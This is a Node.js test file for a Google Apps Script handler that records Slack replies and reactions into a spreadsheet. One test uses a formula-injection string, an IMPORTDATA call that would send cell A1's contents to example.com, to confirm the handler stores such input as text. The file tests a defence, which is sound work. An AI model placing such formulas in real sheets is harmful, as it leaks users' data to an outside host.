const test = require('node:test');
const assert = require('node:assert/strict');
const { loadGas, plain } = require('./harness');

// 偽のシート（appendRow・getRange の読み書き・数式・クリアだけ）
function fakeSheet(header) {
  const rows = [header.slice()];
  const appended = [header.slice()];   // 書いたとおりの値（アポストロフィ付き）
  const formulas = {};   // "行,列" -> 数式
  const cell = (r, c) => ({
    getValue: () => (rows[r - 1] || [])[c - 1],
    setValue: (v) => { (rows[r - 1] = rows[r - 1] || [])[c - 1] = v; },
    clearContent: () => { if (rows[r - 1]) rows[r - 1][c - 1] = ''; }
  });
  return {
    rows, formulas, appended,
    getDataRange: () => ({ getValues: () => rows }),
    getLastRow: () => rows.length,
    // 本物のシートは、先頭のアポストロフィを「文字列にする印」として取り除いて保存する
    appendRow: (values) => {
      appended.push(values.slice());
      rows.push(values.map((v) => (typeof v === 'string' && v.startsWith("'") ? v.slice(1) : v)));
    },
    getRange: (r, c, nr, nc) => Object.assign(cell(r, c), {
      setFormulas: (fs) => fs.forEach((line, i) => line.forEach((f, j) => { formulas[(r + i) + ',' + (c + j)] = f; }))
    })
  };
}

function setup() {
  const gas = loadGas();
  const { ctx } = gas;
  const header = gas.get('VIZ_REVIEW_HEADER');
  const sheet = fakeSheet(header);
  gas.stub({
    getConfig_: () => ({ managementSpreadsheetId: 'x' }),
    SpreadsheetApp: { openById: () => ({ getSheetByName: () => sheet }) },
    getOrCreateSheet_: () => sheet,
    LockService: { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) },
    getVizChannelId_: () => 'C1',
    findVizPostForEvent_: () => ({ author: 'UAUTHOR1', messageTs: '1760000000.000100' })
  });
  return { gas, ctx, sheet, COL: gas.get('VIZ_REVIEW_COL') };
}
const reply = (over) => Object.assign({
  type: 'message', channel: 'C1', user: 'UREVIEW1', text: 'いい構成ですね', ts: '1760000001.000100',
  thread_ts: '1760000000.000100', event_ts: '1760000001.000100'
}, over);

test('返信: 本文が「返信内容」に入り、投稿者・投稿内容を引く数式が入る', () => {
  const { ctx, sheet, COL } = setup();
  ctx.handleVizReply_({}, reply({ text: 'A &amp; B &lt;ok&gt;' }));
  assert.equal(sheet.rows.length, 2);
  const row = sheet.rows[1];
  assert.equal(row[COL.KIND], '返信');
  assert.equal(row[COL.USER], 'UREVIEW1');
  assert.equal(row[COL.REPLY_TEXT], 'A & B <ok>', 'Slackのエスケープを元に戻す');
  const f = sheet.formulas['2,' + (COL.POST_AUTHOR + 1)];
  assert.match(f, /ナイスチャレンジ投稿ログ/);
  assert.match(f, /\$E2/, '投稿ID（E列）で引く');
  assert.match(f, /\$B\$2:\$B/, '投稿ログの投稿者（B列）');
  assert.match(sheet.formulas['2,' + (COL.POST_TEXT + 1)], /\$F\$2:\$F/, '投稿ログの投稿内容（F列）');
});

test('返信: 数式として実行される文字列で始まる本文は、文字列にする', () => {
  const { ctx, sheet, COL } = setup();
  ctx.handleVizReply_({}, reply({ text: '=IMPORTDATA("https://example.com/?"&A1)', ts: '1760000002.000100' }));
  // 本物のシートでは、先頭のアポストロフィは取り除かれ、「=…」という文字列として保存される（数式にならない）
  assert.equal(sheet.rows[1][COL.REPLY_TEXT], '=IMPORTDATA("https://example.com/?"&A1)');
  assert.ok(sheet.appended[1][COL.REPLY_TEXT].startsWith("'="), '書くときは先頭にアポストロフィを付ける');
  ctx.handleVizReply_({}, reply({ text: '+1 ありがとう', ts: '1760000003.000100' }));
  assert.ok(sheet.appended[2][COL.REPLY_TEXT].startsWith("'+"));
  ctx.handleVizReply_({}, reply({ text: '普通の文章', ts: '1760000004.000100' }));
  assert.equal(sheet.rows[3][COL.REPLY_TEXT], '普通の文章');
});

test('返信: 同じ返信の再送・投稿者本人の返信は記録しない', () => {
  const { ctx, sheet } = setup();
  ctx.handleVizReply_({}, reply({}));
  ctx.handleVizReply_({}, reply({}));                                  // 再送
  assert.equal(sheet.rows.length, 2);
  ctx.handleVizReply_({}, reply({ user: 'UAUTHOR1', ts: '1760000009.000100' }));   // 本人
  assert.equal(sheet.rows.length, 2);
});

test('返信が編集されたら、本文を更新する', () => {
  const { ctx, sheet, COL } = setup();
  ctx.handleVizReply_({}, reply({}));
  ctx.handleVizReply_({}, {
    type: 'message', subtype: 'message_changed', channel: 'C1', event_ts: '1760000050.000100',
    message: { ts: '1760000001.000100', thread_ts: '1760000000.000100', user: 'UREVIEW1', text: '直しました' }
  });
  assert.equal(sheet.rows.length, 2, '行は増えない');
  assert.equal(sheet.rows[1][COL.REPLY_TEXT], '直しました');
});

test('返信が削除されたら、本文を消して削除日時を入れる。消えた返信の編集で本文は戻らない', () => {
  const { ctx, sheet, COL } = setup();
  ctx.handleVizReply_({}, reply({}));
  ctx.handleVizReply_({}, {
    type: 'message', subtype: 'message_deleted', channel: 'C1', deleted_ts: '1760000001.000100',
    previous_message: { thread_ts: '1760000000.000100' }, event_ts: '1760000100.000100'
  });
  assert.equal(sheet.rows[1][COL.REPLY_TEXT], '');
  assert.equal(Object.prototype.toString.call(sheet.rows[1][COL.REMOVED_AT]), '[object Date]', '削除日時が入る');
  ctx.handleVizReply_({}, {
    type: 'message', subtype: 'message_changed', channel: 'C1', event_ts: '1760000200.000100',
    message: { ts: '1760000001.000100', thread_ts: '1760000000.000100', user: 'UREVIEW1', text: '戻らない' }
  });
  assert.equal(sheet.rows[1][COL.REPLY_TEXT], '');
});

test('スタンプ: 行に、投稿者・投稿内容の数式が入る（返信内容は空）', () => {
  const { ctx, sheet, COL } = setup();
  ctx.handleVizReaction_({}, { type: 'reaction_added', user: 'UREVIEW1', reaction: 'tada',
    item: { channel: 'C1', ts: '1760000000.000100' }, event_ts: '1760000005.000100' });
  assert.equal(sheet.rows.length, 2);
  assert.equal(sheet.rows[1][COL.KIND], 'スタンプ');
  assert.ok(!sheet.rows[1][COL.REPLY_TEXT]);
  assert.ok(sheet.formulas['2,' + (COL.POST_AUTHOR + 1)]);
});

test('スタンプ: 本文の返信に付いても、親の投稿IDで記録する', () => {
  const { ctx, sheet, COL } = setup();
  ctx.handleVizReaction_({}, { type: 'reaction_added', user: 'UREVIEW1', reaction: 'tada',
    item: { channel: 'C1', ts: '1760000000.000200' }, event_ts: '1760000005.000100' });
  assert.equal(sheet.rows[1][COL.POST_TS], '1760000000.000100');
});

test('これまでの行にも、数式を後から入れられる（何度実行しても同じ）', () => {
  const { ctx, sheet, COL } = setup();
  sheet.rows.push(['d', 'スタンプ', 'U1', 'x', "'1.1", '', ''], ['d', '返信', 'U2', '', "'2.2", '', "'3.3"]);
  ctx.backfillVizReviewPostFormulas_(sheet);
  const once = JSON.stringify(sheet.formulas);
  ctx.backfillVizReviewPostFormulas_(sheet);
  assert.equal(JSON.stringify(sheet.formulas), once);
  assert.match(sheet.formulas['3,' + (COL.POST_TEXT + 1)], /\$E3/);
});

test('見出しと列定義が一致している', () => {
  const { gas } = setup();
  const COL = gas.get('VIZ_REVIEW_COL');
  const header = plain(gas.get('VIZ_REVIEW_HEADER'));
  assert.equal(header[COL.POST_AUTHOR], '投稿者');
  assert.equal(header[COL.POST_TEXT], '投稿内容');
  assert.equal(header[COL.REPLY_TEXT], '返信内容');
  assert.equal(header.length, Object.keys(COL).length);
});
